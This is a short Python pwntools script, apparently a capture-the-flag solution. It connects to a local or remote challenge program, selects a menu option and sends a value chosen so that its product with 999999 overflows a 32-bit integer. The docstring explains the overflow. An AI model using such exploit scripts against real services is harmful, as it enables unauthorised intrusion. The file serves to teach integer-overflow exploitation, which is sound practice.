#!/usr/bin/env python3
'''
The multiplication (and scanf...) in C will take the last 32-bit (if the type is int) as the result
So find a positive number whose multiplication with 999999 is between 2^31 and 2^32, then it will be one of the answers
'''
from pwn import *
import sys

if len(sys.argv) < 3:
    r = process(sys.argv[1])
else:
    r = remote(sys.argv[1], int(sys.argv[2]))
r.recv()
r.sendline(b'1')
r.recv()
ans = 2**31 // 999999 + 1
r.sendline(str(ans).encode())
r.recvline()
print(r.recvline().decode())
r.close()
